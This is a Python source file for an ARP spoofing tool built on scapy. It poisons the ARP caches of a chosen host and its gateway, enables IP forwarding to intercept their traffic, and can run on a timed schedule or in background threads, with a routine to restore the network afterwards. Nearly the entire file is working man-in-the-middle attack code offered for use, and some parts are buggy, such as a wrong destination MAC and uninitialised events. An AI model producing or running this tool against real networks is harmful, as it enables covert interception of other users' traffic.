import re
import platform
from datetime import datetime
from colorama import Fore
import concurrent.futures
from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import srp, send
import sys
import time

class ARPSpoofer:
    """Class for ARP Spoofing"""

    def __init__(self, gateway, ip_address, schedule_enabled=False, start_time=None, end_time=None):
        """Initialize the ARPSpoofer instance."""
        self.gateway = gateway
        self.ip_address = ip_address
        self.schedule_enabled = schedule_enabled
        self.start_time = start_time
        self.end_time = end_time
        self.is_interrupted = False
        self.stop_event = None  # Define stop_event attribute
        self.schedule_event = None  # Define schedule_event attribute

    def is_valid(self):
        """Check if the gateway and IP address are valid."""
        reg = r"^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"
        return re.match(reg, self.gateway) and re.match(reg, self.ip_address)

    @staticmethod
    def set_forwarding(value):
        """Set IP forwarding based on the platform."""
        if platform.system() in ["Linux", "Darwin"]:
            try:
                with open("/proc/sys/net/ipv4/ip_forward", "r+") as file:
                    file.write(value)
            except FileNotFoundError:
                print("[!] File /proc/sys/net/ipv4/ip_forward not found. IP forwarding might not be supported on this system.")

    @staticmethod
    def get_mac(ip_address):
        """Get MAC address for the given IP address."""
        packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address)
        try:
            answer, _ = srp(packet, timeout=5, verbose=False)
            if answer:
                return answer[0][1].hwsrc
        except Exception as e:
            print(f"[!] Error getting MAC Address: {e}")
        return None

    def spoof(self):
        """Spoof ARP packets."""
        target_mac = self.get_mac(self.ip_address)
        if not target_mac:
            log_and_exit(f"{Fore.RED}[!] Unable to get MAC Address..")
        
        # Starting forwarding
        self.set_forwarding("1")

        while True:
            try:
                # Check if the schedule is enabled and within the specified time
                if self.schedule_enabled and not self.is_within_schedule():
                    time.sleep(60)  # Check again in 1 minute
                    continue

                # Start spoofing process
                time.sleep(1)
                if not self.is_interrupted:
                    send(ARP(pdst=self.ip_address, hwdst=target_mac, psrc=self.gateway, op="is-at"), verbose=0)
                    send(ARP(pdst=self.gateway, hwdst=target_mac, psrc=self.ip_address, op="is-at"), verbose=0)
                    print(f"{Fore.YELLOW}[+] (ARP) Spoofing {self.ip_address}... [-] MAC Address: {target_mac}")

            except KeyboardInterrupt:
                self.is_interrupted = True
                self.unspoof()

    def unspoof(self):
        """Undo ARP spoofing and restore network."""
        target_mac = self.get_mac(self.ip_address)
        if not target_mac:
            log_and_exit(f"{Fore.RED}[!] Unable to get MAC Address..")

        # Stop spoofing
        self.is_interrupted = True

        # Restore network
        arp = ARP(pdst=self.ip_address, hwdst=target_mac, psrc=self.gateway, hwsrc=self.get_mac(self.gateway))
        sec = 0

        while True:
            try:
                send(arp, verbose=1)
                sec += 1
                if sec == 5:  # Send packets for X seconds
                    self.set_forwarding("0")
                    log_and_exit(f"\n{Fore.LIGHTGREEN_EX}[*] Network Restored!\n")
                time.sleep(1)

            except KeyboardInterrupt:
                print(f"\n{Fore.LIGHTCYAN_EX}[-] You are already restoring the network!")

    def is_within_schedule(self):
        """Check if the current time is within the specified schedule."""
        current_time = datetime.now().time()
        return self.start_time <= current_time <= self.end_time

    def schedule(self):
        """Schedule ARP spoofing based on the specified time."""
        while not self.stop_event.is_set():
            # Check if the schedule is enabled and within the specified time
            if self.schedule_enabled and self.is_within_schedule():
                # If not already spoofing, start spoofing
                if not self.schedule_event.is_set():
                    print(f"{Fore.YELLOW}[+] Scheduled Spoofing Started")
                    self.spoof()
                    self.schedule_event.set()
            else:
                # If spoofing due to schedule but outside the schedule, stop spoofing
                if self.schedule_event.is_set():
                    print(f"{Fore.YELLOW}[+] Scheduled Spoofing Stopped")
                    self.unspoof()
                    self.schedule_event.clear()
            time.sleep(60)  # Check every minute

    def spoof_in_background(self):
        """Run ARP spoofing in the background."""
        with concurrent.futures.ThreadPoolExecutor() as executor:
            executor.submit(self.spoof)
            executor.submit(self.schedule)

    def unspoof_in_background(self):
        """Run ARP unspoofing in the background."""
        with concurrent.futures.ThreadPoolExecutor() as executor:
            executor.submit(self.unspoof)

def log_and_exit(text):
    """Log the message and exit the program."""
    print(text)
    sys.exit(1)
